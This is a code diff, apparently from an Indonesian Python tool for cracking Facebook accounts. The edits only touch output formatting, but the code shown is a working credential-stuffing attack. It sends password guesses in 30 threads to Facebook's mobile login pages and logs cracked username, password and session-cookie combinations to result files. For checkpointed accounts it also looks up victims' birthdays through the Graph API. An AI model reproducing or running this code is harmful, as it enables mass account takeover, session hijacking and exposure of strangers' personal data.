@@ -655,7 +655,7 @@ class __crack__:
 
     def __api__(self, user, __yan__):
         global ok,cp,loop
-        sys.stdout.write('\r [%s#%s] [Retakan]] %s/%s [OK-:%s] [CP-:%s] '%(O,N,loop,len(self.id),len(ok),len(cp))),
+        sys.stdout.write('\r [%s#%s][Retakan]%s/%s[OK-:%s][CP-:%s] '%(O,N,loop,len(self.id),len(ok),len(cp))),
         sys.stdout.flush()
         for pw in __yan__:
             pw = pw.lower()
@@ -675,7 +675,7 @@ class __crack__:
                 loop +=1
                 self.__api__()
             if 'access_token' in response.text and 'EAAA' in response.text:
-                print '\r  %s[OK NGAB] %s•%s                 %s' % (H,user,pw,N)
+                print '\r %s[OK NGAB] %s•%s                 %s' % (H,user,pw,N)
                 wrt = ' [✓] %s|%s' % (user,pw)
                 ok.append(wrt)
                 open('results/OK-%s-%s-%s.txt' % (ha, op, ta), 'a').write('%s\n' % wrt)
@@ -687,7 +687,7 @@ class __crack__:
                     cp_ttl = requests.get('https://graph.facebook.com/%s?access_token=%s'%(user,kontol)).json()['birthday']
                     month, day, year = cp_ttl.split('/')
                     month = bulan_ttl[month]
-                    print '\r  %s[CP NGAB] %s•%s•%s %s %s     %s' % (K,user,pw,day,month,year,N)
+                    print '\r %s[CP NGAB] %s•%s•%s %s %s     %s' % (K,user,pw,day,month,year,N)
                     wrt = ' [×] %s•%s•%s %s %s' % (user,pw,day,month,year)
                     cp.append(wrt)
                     open('results/CP-%s-%s-%s.txt' % (ha, op, ta), 'a').write('%s\n' % wrt)
@@ -699,7 +699,7 @@ class __crack__:
                 except:
                     pass
 
-                print '\r  %s[CP NGAB] %s•%s                %s' % (K,user,pw,N)
+                print '\r %s[CP NGAB] %s•%s                %s' % (K,user,pw,N)
                 wrt = ' [×] %s•%s' % (user,pw)
                 cp.append(wrt)
                 open('results/CP-%s-%s-%s.txt' % (ha, op, ta), 'a').write('%s\n' % wrt)
@@ -710,7 +710,7 @@ class __crack__:
 
     def __mbasic__(self, user, __yan__):
         global ok,cp,loop
-        sys.stdout.write('\r [%s#%s] [Retakan]] %s/%s [OK-:%s] [CP-:%s] '%(O,N,loop,len(self.id),len(ok),len(cp))),
+        sys.stdout.write('\r [%s#%s][Retakan]%s/%s[OK-:%s][CP-:%s] '%(O,N,loop,len(self.id),len(ok),len(cp))),
         sys.stdout.flush()
         for pw in __yan__:
             pw = pw.lower()
@@ -726,7 +726,7 @@ class __crack__:
             b = ses.post("https://mbasic.facebook.com/login.php", data={"email": user, "pass": pw, "login": "submit"})
             if "c_user" in ses.cookies.get_dict().keys():
             	kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
-                print '\r  %s[OK NGAB] %s•%s•%s                 %s' % (H,user,pw,kuki,N)
+                print '\r %s[OK NGAB] %s•%s•%s                 %s' % (H,user,pw,kuki,N)
                 wrt = ' [✓] %s|%s•%s' % (user,pw,kuki)
                 ok.append(wrt)
                 open('results/OK-%s-%s-%s.txt' % (ha, op, ta), 'a').write('%s\n' % wrt)
@@ -738,7 +738,7 @@ class __crack__:
                     cp_ttl = requests.get('https://graph.facebook.com/%s?access_token=%s'%(user,kontol)).json()['birthday']
                     month, day, year = cp_ttl.split('/')
                     month = bulan_ttl[month]
-                    print '\r  %s[CP NGAB] %s•%s•%s %s %s     %s' % (K,user,pw,day,month,year,N)
+                    print '\r %s[CP NGAB] %s•%s•%s %s %s     %s' % (K,user,pw,day,month,year,N)
                     wrt = ' [×] %s•%s•%s %s %s' % (user,pw,day,month,year)
                     cp.append(wrt)
                     open('results/CP-%s-%s-%s.txt' % (ha, op, ta), 'a').write('%s\n' % wrt)
@@ -750,7 +750,7 @@ class __crack__:
                 except:
                     pass
 
-                print '\r  %s[CP NGAB] %s•%s                %s' % (K,user,pw,N)
+                print '\r %s[CP NGAB] %s•%s                %s' % (K,user,pw,N)
                 wrt = ' [×] %s•%s' % (user,pw)
                 cp.append(wrt)
                 open('results/CP-%s-%s-%s.txt' % (ha, op, ta), 'a').write('%s\n' % wrt)
@@ -761,7 +761,7 @@ class __crack__:
 
     def __mfb__(self, user, __yan__):
         global ok,cp,loop
-        sys.stdout.write('\r [%s#%s] [Retakan]] %s/%s [OK-:%s] [CP-:%s] '%(O,N,loop,len(self.id),len(ok),len(cp))),
+        sys.stdout.write('\r [%s#%s][Retakan]%s/%s[OK-:%s][CP-:%s] '%(O,N,loop,len(self.id),len(ok),len(cp))),
         sys.stdout.flush()
         for pw in __yan__:
             pw = pw.lower()
@@ -777,7 +777,7 @@ class __crack__:
             b = ses.post("https://m.facebook.com/login.php", data={"email": user, "pass": pw, "login": "submit"})
             if "c_user" in ses.cookies.get_dict().keys():
             	kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
-                print '\r  %s[OK NGAB] %s•%s•%s                 %s' % (H,user,pw,kuki,N)
+                print '\r %s[OK NGAB] %s•%s•%s                 %s' % (H,user,pw,kuki,N)
                 wrt = ' [✓] %s•%s•%s' % (user,pw,kuki)
                 ok.append(wrt)
                 open('results/OK-%s-%s-%s.txt' % (ha, op, ta), 'a').write('%s\n' % wrt)
@@ -789,7 +789,7 @@ class __crack__:
                     cp_ttl = requests.get('https://graph.facebook.com/%s?access_token=%s'%(user,kontol)).json()['birthday']
                     month, day, year = cp_ttl.split('/')
                     month = bulan_ttl[month]
-                    print '\r  %s[CP NGAB] %s•%s•%s %s %s     %s' % (K,user,pw,day,month,year,N)
+                    print '\r %s[CP NGAB] %s•%s•%s %s %s     %s' % (K,user,pw,day,month,year,N)
                     wrt = ' [×] %s•%s•%s %s %s' % (user,pw,day,month,year)
                     cp.append(wrt)
                     open('results/CP-%s-%s-%s.txt' % (ha, op, ta), 'a').write('%s\n' % wrt)
@@ -801,7 +801,7 @@ class __crack__:
                 except:
                     pass
 
-                print '\r  %s[CP NGAB] %s•%s                %s' % (K,user,pw,N)
+                print '\r %s[CP NGAB] %s•%s                %s' % (K,user,pw,N)
                 wrt = ' [×] %s•%s' % (user,pw)
                 cp.append(wrt)
                 open('results/CP-%s-%s-%s.txt' % (ha, op, ta), 'a').write('%s\n' % wrt)
@@ -834,8 +834,8 @@ class __crack__:
             os.remove(self.apk)
             hasil(ok,cp)
         elif yan in ('2', '02'):
-            print '\n [%s+%s] hasil OK disimpan ke -> results/OK-%s-%s-%s.txt'%(O,N,ha, op, ta)
-            print ' [%s+%s] hasil CP disimpan ke -> results/CP-%s-%s-%s.txt'%(O,N,ha, op, ta)
+            print '\n [%s+%s] hasil OK disimpan di-> results/OK-%s-%s-%s.txt'%(O,N,ha, op, ta)
+            print ' [%s+%s] hasil CP disimpan di-> results/CP-%s-%s-%s.txt'%(O,N,ha, op, ta)
             print '\n [%s!%s] Jika tidak ada hasil, gunakan mode pesawat (2 detik)\n'%(M,N)
             with YayanGanteng(max_workers=30) as (__yayanXD__):
             	for yntkts in self.id: # Yo Ndak Tau Kok Tanya Saia
@@ -853,8 +853,8 @@ class __crack__:
             os.remove(self.apk)
             hasil(ok,cp)
         elif yan in ('3', '03'):
-            print '\n [%s+%s] hasil OK disimpan ke -> results/OK-%s-%s-%s.txt'%(O,N,ha, op, ta)
-            print ' [%s+%s] hasil CP disimpan ke -> results/CP-%s-%s-%s.txt'%(O,N,ha, op, ta)
+            print '\n [%s+%s] hasil OK disimpan di-> results/OK-%s-%s-%s.txt'%(O,N,ha, op, ta)
+            print ' [%s+%s] hasil CP disimpan di-> results/CP-%s-%s-%s.txt'%(O,N,ha, op, ta)
             print '\n [%s!%s] Jika tidak ada hasil, gunakan mode pesawat (2 detik)\n'%(M,N)
             with YayanGanteng(max_workers=30) as (__yayanXD__):
             	for yntkts in self.id: # Yo Ndak Tau Kok Tanya Saia
